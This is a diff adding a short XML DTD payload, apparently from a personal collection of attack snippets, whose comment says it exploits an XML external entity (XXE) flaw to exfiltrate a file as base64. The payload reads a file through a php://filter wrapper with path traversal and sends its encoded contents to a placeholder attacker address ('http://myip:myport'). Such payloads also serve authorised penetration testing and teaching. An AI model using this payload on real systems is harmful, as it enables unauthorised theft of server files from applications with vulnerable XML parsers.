@@ -1,0 +1,11 @@
+<!--
+author: otter ʕ •ᴥ•ʔ
+
+This snippet is used to exploit a XXE processing vulnerability to exfiltrate the contents
+of a file as a base64-encoded string.
+-->
+
+<!ENTITY % file SYSTEM 'php://filter/convert.base64-encode/resource=../../../../path/to/file'>
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://myip:myport/?file=%file;'>">
+%eval;
+%exfiltrate;
